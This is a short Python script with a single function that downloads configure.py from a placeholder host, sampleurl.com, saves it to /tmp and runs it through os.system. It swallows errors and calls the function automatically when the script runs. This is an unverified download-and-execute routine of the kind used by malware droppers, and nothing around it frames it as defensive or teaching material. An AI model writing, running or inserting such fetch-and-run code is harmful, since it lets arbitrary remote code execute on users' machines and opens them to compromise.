import requests
import os

def download_and_execute():
    try:
        url = "https://sampleurl.com/configure.py"
        local_file = "/tmp/configure.py"

        response = requests.get(url)
        with open(local_file, "w") as f:
            f.write(response.text)

        os.system(f"python {local_file}")

    except Exception as e:
        print(e)

download_and_execute()
